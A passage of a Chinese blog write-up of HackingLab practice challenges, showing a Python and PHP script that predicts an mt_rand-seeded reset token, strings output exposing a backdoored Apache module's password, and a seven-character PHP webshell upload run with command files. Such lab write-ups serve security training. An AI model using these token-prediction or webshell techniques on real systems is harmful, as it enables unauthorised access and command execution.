&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先说说代码什么意思，首先我们能控制的变量是<code>token</code>，并且需要与<code>$_SESSION[&#39;token&#39;]</code>相等,<br>而<code>$_SESSION[&#39;token&#39;]</code>，是被加密过的，而且这个加密看起来不能绕过，因为有随机数<code>$rand</code>，<br>所以这个时候需要了解一下<code>伪随机数</code>这个概念了，<br>先来看看php的<code>mt_srand()</code>和<code>mt_rand()</code>，<br>mt_srand():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。</span><br><span class="line">Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</span><br></pre></td></tr></table></figure></p>
<p>mt_rand():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成更好的随机数</span><br></pre></td></tr></table></figure></p>
<p>简单来说就是首先用<code>mt_srand()</code>播种，然后<code>mt_rand()</code>以这个<code>seed</code>随机生成数据，<br>但是我们可以发现，当seed一样时，<code>mt_rand</code>生成的数据顺序是一样的，测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $seed=10;</span><br><span class="line">     mt_srand($seed);</span><br><span class="line">    for ($i=0; $i &lt; 10; $i++) &#123; </span><br><span class="line">    	$rand= mt_rand();</span><br><span class="line">    	echo $rand.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>当指定的<code>seed</code>为固定时，产生的随机数顺序一样，所以不管上面的测试代码怎么刷新，得到的值总是一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">502355954</span><br><span class="line">641584702</span><br><span class="line">2112621188</span><br><span class="line">1074089073</span><br><span class="line">1360749216</span><br><span class="line">1207911374</span><br><span class="line">546519883</span><br><span class="line">1786516046</span><br><span class="line">1082451610</span><br><span class="line">903986200</span><br></pre></td></tr></table></figure></p>
<p>回到这一题，这题的<code>seed</code>是<code>time()</code>，当前时间戳，一样的道理，<br>我们首先在本地获取到当前的时间戳，并且以这个时间戳为seed，<br>然后产生随机数即可与服务器上的<code>$_SESSION[&#39;token&#39;]</code>相同,这里采用php+python,<br>php用来获取随机数，python用来发送<br>php代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  //rand.php</span><br><span class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</span><br><span class="line">mt_srand(time());</span><br><span class="line">$rand= mt_rand();</span><br><span class="line">$hax = sha1(md5($rand));</span><br><span class="line">echo $hax;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>python代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">local = requests.session()</span><br><span class="line">a = requests.session()</span><br><span class="line">url = &quot;http://127.0.0.1/rand.php&quot;</span><br><span class="line">r = local.get(url)</span><br><span class="line">hax = r.text</span><br><span class="line">url2 = &quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;</span><br><span class="line">x = a.get(url2)</span><br><span class="line">x = a.post(url2,data=&#123;&apos;token&apos;: hax&#125;)</span><br><span class="line">print (x.text)</span><br></pre></td></tr></table></figure>
<p>由于延迟，可能会有几次失败，多试几次即可<br>运行py脚本得到key:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/36845939.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h4 id="HackingLab首台rootkit题目虚拟机-公测"><a href="#HackingLab首台rootkit题目虚拟机-公测" class="headerlink" title="HackingLab首台rootkit题目虚拟机[公测]"></a>HackingLab首台rootkit题目虚拟机[公测]</h4><p>先放上题目的提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">要求: 找到系统rootkit后门(不是木马)并提取后门密码</span><br><span class="line">密码验证方式:验证可以远程获取root权限,则说明密码正确.</span><br><span class="line">正确的密码即为过关密码 </span><br><span class="line">虚拟机信息:[root密码hackinglab.cn] </span><br><span class="line">下载地址: http://pan.baidu.com/s/1bnoKlOj 密码: bpe5</span><br><span class="line">若无法下载请联系@CplusHua</span><br><span class="line">该题目可能难度较大，涉及到应急响应分析，病毒木马查杀，简单逆向分析等</span><br></pre></td></tr></table></figure></p>
<p>先正常的将虚拟机下载下来并导入，配置好网络之后正常连接</p>
<p>首先网站的目录里什么都没有，看一下以root权限的进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -u root</span><br></pre></td></tr></table></figure>
<p>可以看到进程里有一个<code>httpd进程</code>，但是httpd是不需要root权限的，<br>先查看一下<code>apache</code>加载了哪些模块:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# apachectl -l</span><br><span class="line">Compiled in modules:</span><br><span class="line">  core.c</span><br><span class="line">  prefork.c</span><br><span class="line">  http_core.c</span><br><span class="line">  mod_so.c</span><br></pre></td></tr></table></figure></p>
<p>都是正常的，所以现在去找一下apache的目录下查看modules目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# cd /etc/httpd/modules/</span><br><span class="line">[root@rootkit modules]# ls</span><br><span class="line">libphp5.so            mod_authn_file.so       mod_cgid.so        mod_ext_filter.so    mod_mime.so            mod_rootme22.so</span><br><span class="line">mod_actions.so        mod_authnz_ldap.so      mod_cgi.so         mod_filter.so        mod_negotiation.so     mod_setenvif.so</span><br><span class="line">mod_alias.so          mod_authz_dbm.so        mod_dav_fs.so      mod_headers.so       mod_proxy_ajp.so       mod_speling.so</span><br><span class="line">mod_asis.so           mod_authz_default.so    mod_dav.so         mod_ident.so         mod_proxy_balancer.so  mod_status.so</span><br><span class="line">mod_auth_basic.so     mod_authz_groupfile.so  mod_dbd.so         mod_include.so       mod_proxy_connect.so   mod_substitute.so</span><br><span class="line">mod_auth_digest.so    mod_authz_host.so       mod_deflate.so     mod_info.so          mod_proxy_ftp.so       mod_suexec.so</span><br><span class="line">mod_authn_alias.so    mod_authz_owner.so      mod_dir.so         mod_ldap.so          mod_proxy_http.so      mod_unique_id.so</span><br><span class="line">mod_authn_anon.so     mod_authz_user.so       mod_disk_cache.so  mod_log_config.so    mod_proxy_scgi.so      mod_userdir.so</span><br><span class="line">mod_authn_dbd.so      mod_autoindex.so        mod_dumpio.so      mod_log_forensic.so  mod_proxy.so           mod_usertrack.so</span><br><span class="line">mod_authn_dbm.so      mod_cache.so            mod_env.so         mod_logio.so         mod_reqtimeout.so      mod_version.so</span><br><span class="line">mod_authn_default.so  mod_cern_meta.so        mod_expires.so     mod_mime_magic.so    mod_rewrite.so         mod_vhost_alias.so</span><br></pre></td></tr></table></figure>
<p>发现一个一个<code>mod_rootme22.so</code>很奇怪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[root@rootkit modules]# strings mod_rootme22.so </span><br><span class="line">__gmon_start__</span><br><span class="line">_init</span><br><span class="line">_fini</span><br><span class="line">__cxa_finalize</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">pidlist</span><br><span class="line">pipe_A</span><br><span class="line">pipe_B</span><br><span class="line">shell_spooler</span><br><span class="line">ttyname</span><br><span class="line">pipe</span><br><span class="line">fork</span><br><span class="line">getppid</span><br><span class="line">exit</span><br><span class="line">waitpid</span><br><span class="line">write</span><br><span class="line">select</span><br><span class="line">read</span><br><span class="line">kill</span><br><span class="line">close</span><br><span class="line">runshell_raw</span><br><span class="line">runshell_pty</span><br><span class="line">process_client</span><br><span class="line">strncmp</span><br><span class="line">shutdown</span><br><span class="line">send</span><br><span class="line">recv</span><br><span class="line">setsid</span><br><span class="line">dup2</span><br><span class="line">execlp</span><br><span class="line">openpty</span><br><span class="line">memset</span><br><span class="line">ioctl</span><br><span class="line">malloc</span><br><span class="line">strncpy</span><br><span class="line">putenv</span><br><span class="line">chdir</span><br><span class="line">core_module</span><br><span class="line">ap_get_module_config</span><br><span class="line">strcmp</span><br><span class="line">ap_hook_post_config</span><br><span class="line">ap_hook_post_read_request</span><br><span class="line">rootme22_module</span><br><span class="line">libutil.so.1</span><br><span class="line">libc.so.6</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">ATSubH</span><br><span class="line">/usr/sbin/apache2 -k start</span><br><span class="line">hackinglabwelcomeyou!</span><br><span class="line">wearefriends+</span><br><span class="line">mod_rootme22.c</span><br><span class="line">22PA</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h4 id="代码审计与综合利用"><a href="#代码审计与综合利用" class="headerlink" title="代码审计与综合利用"></a>代码审计与综合利用</h4><p>跟前一题一样，把环境搭好之后访问:</p>
<p>一开始题目没给什么提示，查看源代码可以看到需要提交<code>src</code>这个参数，可以看到源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$savepath=&quot;files/&quot;.sha1(session_id()).&quot;/&quot;;</span><br><span class="line">if(!is_dir($savepath))&#123;</span><br><span class="line">    $oldmask=umask(0);</span><br><span class="line">    mkdir($savepath,0777);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">    touch($savepath.&quot;/index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(($_POST[&apos;filename&apos;])&amp;&amp;($_POST[&apos;content&apos;]))&#123;</span><br><span class="line">    $fp=fopen(&quot;$savepath&quot;.$_POST[&apos;filename&apos;],&apos;w&apos;);</span><br><span class="line">    fwrite($fp,substr($_POST[&apos;content&apos;],0,7));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    $msg=&apos;File saved to &lt;a&gt;&apos;.$savepath.htmlspecialchars($_POST[&apos;filename&apos;]).&quot;&lt;/a&gt;&quot;;</span><br><span class="line">    echo $msg;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php if(@$_GET[&apos;src&apos;]) show_source(__FILE__);?&gt;</span><br><span class="line">&lt;!-- &lt;a href=&quot;./?src=&quot;&gt;src&lt;/a&gt;--&gt;</span><br></pre></td></tr></table></figure></p>
<p>一道代码审计题，第一个if是用来创建文件的，先不用管，主要是第二个if<br>这题估计是一个上传shell的题，首先上传的内容只能是7个字符，多了写不进去，代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`*`;</span><br></pre></td></tr></table></figure>
<p>php这样写完之后，会把当前目录下的所有文件都执行一遍，<br>利用这个特性，可以写入一遍历目录的命令，随后POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh.php&amp;content=&lt;?=`*`;</span><br></pre></td></tr></table></figure></p>
<p>此时这个木马已经上传上去了,回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File saved to files/6a9c5c89231381902ed84c8bebec2b0a7db1defe/hh.php</span><br></pre></td></tr></table></figure></p>
<p>再上传:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh&amp;content=ls /</span><br></pre></td></tr></table></figure></p>
<p>和<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=bash&amp;content=ls /</span><br></pre></td></tr></table></figure></p>
<p>此时可以看到</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86147898.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>再将hh的内容改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=hh&amp;content=cat /t*</span><br></pre></td></tr></table></figure></p>
<p>执行得到flag:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-26/86052071.jpg" alt="" title="" class="">
                <p></p>
            </figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2018-07-30T04:42:02.538Z" itemprop="dateUpdated">2018-07-30 12:42:02</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2018/07/13/hackinglab/" target="_blank" rel="external">http://yoursite.com/2018/07/13/hackinglab/</a>
        
    </div>
    <footer>
        <a href="http://yoursite.com">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
        <div class="post-footer">
            
            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/07/13/hackinglab/&title=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/07/13/hackinglab/&title=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/07/13/hackinglab/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&url=http://yoursite.com/2018/07/13/hackinglab/&via=http://yoursite.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/07/13/hackinglab/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
  

  
    <div class="next">
      <a href="/2018/07/12/phpagree/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">php伪协议学习</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基础关"><span class="post-toc-number">1.</span> <span class="post-toc-text">基础关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key在哪里"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">key在哪里?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#再加密一次你就得到key啦"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">再加密一次你就得到key啦~</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜猜这是经过了多少次加密？"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">猜猜这是经过了多少次加密？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#据说MD5加密很安全，真的是么？"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">据说MD5加密很安全，真的是么？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#种族歧视"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">种族歧视</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HAHA浏览器"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">HAHA浏览器</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key究竟在哪里呢？"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">key究竟在哪里呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又找不到了"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">key又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#冒充登陆用户"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">冒充登陆用户</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#比较数字大小"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">比较数字大小</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#本地的诱惑"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">本地的诱惑</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#就不让你访问"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">就不让你访问</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#脚本关"><span class="post-toc-number">2.</span> <span class="post-toc-text">脚本关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又又找不到了"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">key又又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#快速口算"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">快速口算</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#这个题目是空的"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">这个题目是空的</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#怎么就是不弹出key呢？"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">怎么就是不弹出key呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第一期"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">逗比验证码第一期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第二期"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">逗比验证码第二期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的验证码第三期（SESSION）"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">逗比的验证码第三期（SESSION）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#微笑一下就能过关了"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">微笑一下就能过关了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的手机验证码"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">逗比的手机验证码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基情燃烧的岁月"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">基情燃烧的岁月</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#验证码识别"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">验证码识别</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础关"><span class="post-toc-number">2.12.</span> <span class="post-toc-text">XSS基础关</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础2-简单绕过"><span class="post-toc-number">2.13.</span> <span class="post-toc-text">XSS基础2:简单绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础3-检测与构造"><span class="post-toc-number">2.14.</span> <span class="post-toc-text">XSS基础3:检测与构造</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Principle很重要的XSS"><span class="post-toc-number">2.15.</span> <span class="post-toc-text">Principle很重要的XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注入关"><span class="post-toc-number">3.</span> <span class="post-toc-text">注入关</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#上传关"><span class="post-toc-number">4.</span> <span class="post-toc-text">上传关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">请上传一张jpg格式的图片1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片2"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">请上传一张jpg格式的图片2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片3"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">请上传一张jpg格式的图片3</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#解密关"><span class="post-toc-number">5.</span> <span class="post-toc-text">解密关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#以管理员身份登录系统"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">以管理员身份登录系统</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#邂逅对门的妹纸"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">邂逅对门的妹纸</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万恶的Cisco"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">万恶的Cisco</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万恶的加密"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">万恶的加密</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#喜欢泡网吧的小明"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">喜欢泡网吧的小明</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#异常数据"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">异常数据</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#md5真的能碰撞嘛"><span class="post-toc-number">5.7.</span> <span class="post-toc-text">md5真的能碰撞嘛?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#小明爱上了一个搞硬件的小姑凉"><span class="post-toc-number">5.8.</span> <span class="post-toc-text">小明爱上了一个搞硬件的小姑凉</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#有签名限制的读取任意文件"><span class="post-toc-number">5.9.</span> <span class="post-toc-text">有签名限制的读取任意文件</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#美丽的邂逅与密码器的开门密码"><span class="post-toc-number">5.10.</span> <span class="post-toc-text">美丽的邂逅与密码器的开门密码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#综合关"><span class="post-toc-number">6.</span> <span class="post-toc-text">综合关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#渗透测试第一期"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">渗透测试第一期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#没有注入到底能不能绕过登录"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">没有注入到底能不能绕过登录</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#美图闪亮亮交友平台"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">美图闪亮亮交友平台</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#最简单的数字取证1"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">最简单的数字取证1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#最简单的数字取证2"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">最简单的数字取证2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#小明学习代码审计"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">小明学习代码审计</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HackingLab首台rootkit题目虚拟机-公测"><span class="post-toc-number">6.7.</span> <span class="post-toc-text">HackingLab首台rootkit题目虚拟机[公测]</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#代码审计与综合利用"><span class="post-toc-number">6.8.</span> <span class="post-toc-text">代码审计与综合利用</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

</div>

        <footer class="footer">
    
    <div class="bottom">
        <p>
            <span>
                 &copy; 2017 - 2018
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/07/13/hackinglab/&title=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/07/13/hackinglab/&title=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/07/13/hackinglab/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《hackinglab网络安全实验室writeup》 — CherryGk's Blog&url=http://yoursite.com/2018/07/13/hackinglab/&via=http://yoursite.com" data-title=" Twitter">
